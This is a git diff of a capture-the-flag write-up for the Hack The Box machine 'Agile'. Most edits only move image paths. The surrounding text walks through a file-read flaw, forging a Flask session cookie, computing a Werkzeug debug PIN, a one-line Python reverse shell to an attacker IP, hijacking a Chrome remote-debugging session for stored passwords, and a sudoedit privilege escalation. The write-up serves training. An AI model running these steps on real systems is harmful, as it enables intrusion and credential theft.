@@ -44,21 +44,21 @@ ff02::2 ip6-allrouters
 
 We see superpass as a super password manager:
 
-![Home Page](SuperpassHomepage.png)
+![Home Page](Images/SuperpassHomepage.png)
 
 Trying to login with generic credentials does not succeed, but we are able to register an account, `asdf:asdf`
 
-![asdf registration](Register.png)
+![asdf registration](Images/Register.png)
 
 We see a vault where we can begin to generate passwords, and label them with sites/usernames. 
 
-![Add a password](PassGen.png)
+![Add a password](Images/PassGen.png)
 
 The export feature is interesting, as depending on how the query is designed, we may be able to alter our request and receive unintended responses. Using burpsuite, we can intercept our traffic and get a better idea on how we are interacting with the web service.
 
 We can see upon clicking `Export` we are sent to the url http://superpass.htb/vault/export on a GET request:
 
-![No password error](NoPass.png)
+![No password error](Images/NoPass.png)
 
 An interesting finding at this point, we see that `superpass.htb` server
 is described as nginx. However, this /vault/export pathway is not a .php file, as visiting superpass.htb/vault/export.php results in `404 Not Found`. We will eventually learn that this service is running from Flask, although it wasn't apparent at first glance if you didn't run into the common SQLAlchemy error.
@@ -67,7 +67,7 @@ Since we didn't click the save icon when generating out password, it seems like 
 
 Once we add a password, we can see the call redirects to a custom url, `download?fn=asdf_export_49adcafaf8.csv`. We might be able to reverse the process that generates the names, but regardless we will need more information such as usernames before we could take advantage:
 
-![Burpsuite Export](Export.png)
+![Burpsuite Export](Images/Export.png)
 
 ### Arbitrary file read in `/download`
 
@@ -76,7 +76,7 @@ In a simpler approach, we can check if we are able to reference any file by spec
 
 Upon visiting this link, we receive a download prompt for our file. We can proceed to visit each url we want to check then open the downloaded file individually, or we can see the output directly through burpsuite:
 
-![/etc/passwd](etc_passwd.png)
+![/etc/passwd](Images/etc_passwd.png)
 
 
 In this file we can see 4 user accounts:
@@ -89,7 +89,7 @@ dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
 
 Viewing a non-existent file we can see interesting information through the given error. The service is utilizing Werkzeug Debugger (python Flask), the download function is pulling from `/tmp/` and the flask SECRET is also displayed:
 
-![Flask Error](Error.png)
+![Flask Error](Images/Error.png)
 Note, the SECRET is only visible when looking at the source page, or through raw output such as Burpsuite or `curl`:
 
 ```html
@@ -103,7 +103,7 @@ Note, the SECRET is only visible when looking at the source page, or through raw
 
 The last section in the traceback is particularly important, as it gives a full pathway to our source files so that we might view them exploiting this `download` vulnerability.
 
-![Vault Views](Vault_views.png)
+![Vault Views](Images/Vault_views.png)
 
 From here, we can enumerate all or most of the python source files by watching the imports. For example, `from superpass.services.utility_service import get_random` tells us that there is a python file accessible at `/app/app/superpass/services/utility_service.py`. We can also determine that the main `app.py` file will be located at `/app/app/superpass/app.py`, based on where the import path is starting.
 
@@ -156,7 +156,7 @@ Starting with our cookie, we can grab it from Burpsuite's request after session=
 
 Visiting a [Flask cookie decoder online tool](https://www.kirsle.net/wizards/flask-session.cgi), we can decode without issue into something more readable:
 
-![Flask Decoded](DecodeCookie.png)
+![Flask Decoded](Images/DecodeCookie.png)
 
 
 ```json
@@ -169,7 +169,7 @@ Visiting a [Flask cookie decoder online tool](https://www.kirsle.net/wizards/fla
 
 While the `_id` appears to be a unique string likely tied to our current login session, we can see that we are user_id 9. Assuming the count starts at 0 and the admin has the first account, I edit this segment of the cookie and then I must re-sign using Flask's secret key. To do so, I utilize the popular tool [Flask-Unsign](https://github.com/Paradoxis/Flask-Unsign).
 
-```json
+```
 ┌──(kali㉿kali)-[~/Documents/Agile]
 └─$ cat tosign.txt                                      
 {'_fresh': True, '_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '0'}
@@ -198,11 +198,11 @@ This approach was successful on box release, but has since been patched. Apparen
 
 Eventually I turn myself to the system's active `debugger` mode. We noticed that this is turned on, since when we requested to download a file that didn't exist, we saw detailed traceback. From these error pages, we can open an interactive terminal by clicking on the console icon available when hovering over one of the code lines:
 
-![Console Option Available](ConsoleOption.png)
+![Console Option Available](Images/ConsoleOption.png)
 
 However, in order to prevent any random user from executing shell commands, a customized PIN is generated when the web server is launched. This is PIN is intended to be accessible only to the operators on the machine. The PIN is provided to console output, not saved in any guessable location.
 
-![PIN requirement](PIN_Ask.png)
+![PIN requirement](Images/PIN_Ask.png)
 
 There is a [hacktricks article](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) covering how we generate a matching PIN number based on some of the system's information. 
 
@@ -231,7 +231,7 @@ private_bits = [
 Private Bits:
 - When accessing `/sys/class/net/eth0/address`, we get id 00:50:56:b9:ce:53:
 
-![eth0 address](Address.png)
+![eth0 address](Images/Address.png)
 
 To convert into the private bit variable, we utilize python to print:
 ```python
@@ -241,11 +241,11 @@ To convert into the private bit variable, we utilize python to print:
 
 - Machine ID is a combination of `/etc/machine-id` and the last section of `/proc/self/cgroup`. Visiting `/etc/machine-id`:
 
-![Machine ID](Machine.png)
+![Machine ID](Images/Machine.png)
 
 Visiting `/proc/self/cgroup`:
 
-![cgroup](cgroup.png)
+![cgroup](Images/cgroup.png)
 
 The combined bit is `ed5b159560f54721827644bc9b220d00superpass.service`
 
@@ -253,7 +253,7 @@ The combined bit is `ed5b159560f54721827644bc9b220d00superpass.service`
 
 Now with a debug PIN correctly generated, we can finally access the debugging console by clicking the interactive icon on any code in the error:
 
-![debug active](consoleready.png)
+![debug active](Images/consoleready.png)
 
 `import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.133",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")`
 
@@ -278,7 +278,7 @@ script -qc /bin/bash /dev/null
 
 From here we background the session with ctrl+Z, and type `stty raw -echo; fg`. The fg will put us back into the rev shell session, where we press enter a 2nd time and our shell has been stabilized.
 
-```
+```bash
 (venv) www-data@agile:/app/app$ ^Z
 zsh: suspended  nc -nvlp 8888
                                                                                                                                                          
@@ -382,7 +382,7 @@ We have finally reached the `user.txt`.
 
 Manual enumeration did not yield anything interesting to me. However, executing `linpeas` showed me a potential route to privilege escalation i was unaware of.
 
-![Chrome session with remote debugging port](RunnerDebugPort.png)
+![Chrome session with remote debugging port](Images/RunnerDebugPort.png)
 
 There is a process of google chrome running, and special attention is drawn to the fact that the `--remote-debugging-port` flag is set. It appears that we might be able to hijack this web session, and explore the capabilities of what `runner` can access in this webpage. First, we need a way for our local browser to reach the box's port 41829. This is not directly accessible from our machine, so we must apply port forwarding. Chisel is a popular option, but since ssh exists I just utilize this approach
 
@@ -392,23 +392,23 @@ $ ssh -L 1080:localhost:41829 corum@superpass.htb
 
 To enter the port forwarding page in Google Chrome, in the url segment we type `chrome://inspect/#devices`. Next, we must configure our ports to the right of "Discover network targets"
 
-![Port Forwarding Page](ChromeConfig1.png)
+![Port Forwarding Page](Images/ChromeConfig1.png)
 
 Set the address as localhost:1080, matching the listening port listed in our ssh command. This traffic will be forwarded to Agile box's port 41829.
 
-![Setting the address](ChromeConfig2.png)
+![Setting the address](Images/ChromeConfig2.png)
 
 Now we can see a remote target. Notice the address is at `http://test.superpass.htb`. This seems to be a local-only version of the service, potentially with different password information than the live version we interacted with previously.
 
-![Target is now visible and accessible](RemoteTarget.png)
+![Target is now visible and accessible](Images/RemoteTarget.png)
 
 Selecting `inspect` will open a new DevTools tab, where we can interact with the chrome session.
 
-![Interactive Chrome Session in test.superpass.htb](SuperpassTestSession.png)
+![Interactive Chrome Session in test.superpass.htb](Images/SuperpassTestSession.png)
 
 Selecting the Vault, we see new passwords, this time for `edwards`. This was also a user account name on the machine.
 
-![Ed's Creds](EdCred.png)
+![Ed's Creds](Images/EdCred.png)
 
 Using the inspect tools to the side of our web session, we can easily grab the raw text to copy. For this kind of password it is much better, so that we do not mistype when copying by hand.
 
@@ -447,7 +447,7 @@ This `/app/app-testing/tests/functional/creds.txt` is very desirable based on th
 edwards@agile:/home/corum$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
 ```
 
-![Ed's Creds 2](EdCred2.png)
+![Ed's Creds 2](Images/EdCred2.png)
 
 We see in a nano editor some more credentials for edwards.
 
@@ -526,11 +526,11 @@ edwards@agile:/dev/shm$ sudo -u dev_admin sudoedit /app/app-testing/tests/functi
 ```
 When we execute we are not editing `creds.txt`. Instead, we see `/app/venv/bin/activate`
 
-![/app/venv/bin/activate in vim](ativate.png)
+![/app/venv/bin/activate in vim](Images/ativate.png)
 
 To ensure our payload runs at the start of this script, I insert the command before the commented lines:
 
-![Malicious Payload](Payload_added.png)
+![Malicious Payload](Images/Payload_added.png)
 
 Now after waiting a few seconds, the connection reaches my kali machine:
 ```bash
